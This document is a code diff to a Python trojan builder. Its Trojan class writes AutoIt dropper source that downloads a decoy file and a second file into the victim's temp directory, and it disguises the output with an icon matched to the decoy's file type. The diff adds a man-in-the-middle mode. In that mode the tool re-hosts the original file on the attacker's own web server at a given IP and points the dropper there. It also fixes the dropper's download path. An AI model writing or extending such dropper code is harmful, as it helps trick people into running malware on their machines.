@@ -2,6 +2,7 @@
 import subprocess
 import os
 import zipfile
+import requests
 
 
 
@@ -20,7 +21,7 @@ Func _DownloadFile($sURL)
     Local $hDownload, $sFile
     $sFile = StringRegExpReplace($sURL, "^.*/", "")
     $sFile = StringReplace($sFile, "#", "")
-    $sDirectory = @TempDir & $sFile
+    $sDirectory = @TempDir & "/" & $sFile
     $hDownload = InetGet($sURL, $sDirectory, 17, 1)
     InetClose($hDownload)
     Return $sDirectory
@@ -29,16 +30,26 @@ EndFunc   ;==>_GetURLImage
 
 class Trojan:
 
-	def __init__(self, url1, url2, icon, out_file):
+	def __init__(self, url1, url2, icon, out_file, ip):
 		self.url1 = url1
 		self.url2 = url2
 		file_type = url1.split(".")[-1].replace("#", "")
 		self.icon = self.set_icon(icon, file_type)
 		self.out_file = out_file
-		
-					
-	def create(self):
-		urls = 'Local $urls = "' +  self.url1 + "," +self.url2 + '"\n'
+		self.ip = ip
+
+	def create(self, mitm=None):
+		if mitm==True:
+			name_original_file = self.url1.split("/")[-1].replace("#","")
+			r = requests.get(self.url1)
+			with open(f"/var/www/html/temp_{name_original_file}", "wb") as f:
+				f.write(r.content)
+				f.close()
+        
+			urls = 'Local $urls = "http://' +  self.ip + f"/temp_{name_original_file}," +self.url2 + '"\n'
+		else:
+			urls = 'Local $urls = "' + self.url1 + "," + self.url2 + '"\n'
+
 		with open(TROJAN_SOURCE_CODE_FILE, "w") as trojan_file:
 			trojan_file.write(urls + trojan_code)
 
